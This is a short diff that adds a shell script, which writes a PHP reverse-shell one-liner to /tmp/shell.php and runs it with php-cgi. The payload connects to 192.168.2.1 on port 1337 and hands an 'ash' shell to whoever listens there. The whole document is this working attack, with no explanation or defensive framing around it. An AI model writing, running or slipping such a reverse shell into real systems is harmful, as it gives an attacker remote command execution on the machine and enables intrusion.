@@ -1,0 +1,5 @@
+#!/bin/sh
+
+echo '<? $sock=fsockopen("192.168.2.1",1337);`ash <&3 >&3 2>&3`;' > /tmp/shell.php;
+
+php-cgi -f /tmp/shell.php
